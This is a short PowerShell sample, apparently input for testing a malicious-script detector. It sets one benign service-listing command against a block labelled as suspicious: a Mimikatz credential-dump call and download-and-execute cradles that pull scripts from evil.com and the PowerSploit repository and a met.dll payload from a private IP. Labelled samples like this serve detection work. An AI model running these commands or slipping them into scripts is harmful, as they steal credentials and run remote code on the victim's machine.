
# Legitimate PowerShell code
Get-Service | Where-Object {$_.Status -eq "Running"}

# Suspicious Empire/Mimikatz commands
Invoke-Mimikatz -DumpCreds
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/powershell.ps1')
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
$bytes = (New-Object Net.WebClient).DownloadData('http://192.168.1.100/met.dll')
